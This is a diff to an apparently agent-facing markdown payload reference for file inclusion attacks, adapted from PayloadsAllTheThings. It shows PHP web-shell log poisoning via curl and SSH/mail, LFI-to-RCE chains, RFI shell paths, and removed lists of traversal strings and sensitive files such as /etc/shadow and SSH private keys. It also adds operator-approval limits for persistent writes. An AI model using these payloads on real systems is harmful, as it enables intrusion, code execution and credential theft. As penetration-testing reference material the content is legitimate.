@@ -1,5 +1,5 @@
 ---
-description: Path traversal, PHP wrappers, null byte, log poisoning, interesting files
+description: PHP wrappers, log/environ/session poisoning, RFI, LFI-to-RCE chains (traversal sequences and interesting files are in directory-traversal-payloads.md)
 skill: file-inclusion
 source: PayloadsAllTheThings — File Inclusion
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -8,38 +8,11 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 # File Inclusion (LFI/RFI) Payloads
 
+> Notation: `PAYLOAD: php <code>` stands for `<code>` wrapped in a PHP open/close tag; expand it when building the request.
+
 > Source: PayloadsAllTheThings — File Inclusion
 
-## Path Traversal Sequences
-
-```
-../../../etc/passwd
-..\..\..\..\windows\win.ini
-....//....//....//etc/passwd
-..///////..////..//////etc/passwd
-```
-
-### Encoding Variants
-
-```
-# URL encoding
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-
-# Double URL encoding
-%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
-
-# UTF-8 overlong encoding
-%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
-
-# Null byte (PHP < 5.3.4)
-../../../etc/passwd%00
-../../../etc/passwd%00.php
-../../../etc/passwd%00.jpg
-
-# Path truncation (4096+ chars, PHP < 5.3)
-../../../etc/passwd/./././././.[repeat to 4096+ chars]
-../../../etc/passwd............[repeat to 4096+ chars]
-```
+Traversal sequences, encodings, null byte, truncation and interesting files per OS: `directory-traversal-payloads.md`.
 
 ## PHP Wrapper Techniques
 
@@ -87,6 +60,12 @@ phar://uploads/evil.phar/shell.php
 
 ## Log Poisoning
 
+Writing to a log or mail spool is a persistent change to the target, and one PHP parse error in
+the poisoned file can break that include for good. Use it only with operator approval
+(`agent/shared-constraints.md` §1), with a single benign `id` payload; prefer the no-write
+filter chain below. Poisoning your own session file changes only your own test data and needs no
+approval.
+
 ### Apache Access Log
 
 ```bash
@@ -95,32 +74,9 @@ curl -A "PAYLOAD: php system($_GET['cmd'])" http://target.example/
 
 # Step 2: Include the log file
 http://target.example/vuln.php?page=/var/log/apache2/access.log&cmd=id
-```
 
-### Apache Error Log
-
-```
-http://target.example/vuln.php?page=/var/log/apache2/error.log
-```
-
-### SSH Auth Log
-
-```bash
-# Step 1: Poison via SSH username
-ssh 'PAYLOAD: php system($_GET["cmd"])'@target.example
-
-# Step 2: Include
-http://target.example/vuln.php?page=/var/log/auth.log&cmd=id
-```
-
-### Mail Log
-
-```bash
-# Step 1: Send email with PHP payload in subject
-mail -s 'PAYLOAD: php system($_GET["cmd"])' www-data@target.example < /dev/null
-
-# Step 2: Include
-http://target.example/vuln.php?page=/var/log/mail.log&cmd=id
+# XAMPP on Windows
+C:\xampp\apache\logs\access.log
 ```
 
 ### /proc/self/environ
@@ -130,43 +86,6 @@ http://target.example/vuln.php?page=/proc/self/environ
 ```
 
 Poison via `User-Agent` header containing PHP code.
-
-## Interesting Files — Linux
-
-```
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/etc/hostname
-/etc/issue
-/proc/self/environ
-/proc/self/cmdline
-/proc/self/cwd/index.php
-/proc/version
-/var/log/apache2/access.log
-/var/log/apache2/error.log
-/var/log/auth.log
-/var/log/syslog
-/home/[user]/.bash_history
-/home/[user]/.ssh/id_rsa
-/home/[user]/.ssh/authorized_keys
-/root/.bash_history
-/root/.ssh/id_rsa
-```
-
-## Interesting Files — Windows
-
-```
-C:\Windows\win.ini
-C:\Windows\System32\drivers\etc\hosts
-C:\Windows\system32\license.rtf
-C:\windows\repair\sam
-C:\windows\repair\system
-C:\inetpub\wwwroot\web.config
-C:\inetpub\logs\LogFiles\
-C:\xampp\apache\conf\httpd.conf
-C:\xampp\apache\logs\access.log
-```
 
 ## Remote File Inclusion (RFI)
 
@@ -190,4 +109,9 @@ http://target.example/vuln.php?page=\\10.0.0.1\share\shell.php
    /tmp/sess_[SESSIONID] or /var/lib/php/sessions/sess_[SESSIONID]
 6. LFI + Upload                -> RCE via uploaded file inclusion
 7. LFI + phar://               -> RCE via deserialization
+8. LFI + php://filter chain    -> RCE with no file write (synacktiv
+   php_filter_chain_generator.py, run host-side; deliver the output as the parameter)
 ```
+
+RFI payload files (`shell.txt` above) must be served by an operator-provisioned listener
+(`$DIR/.listener_url`); the interactsh OOB host records requests but serves nothing.
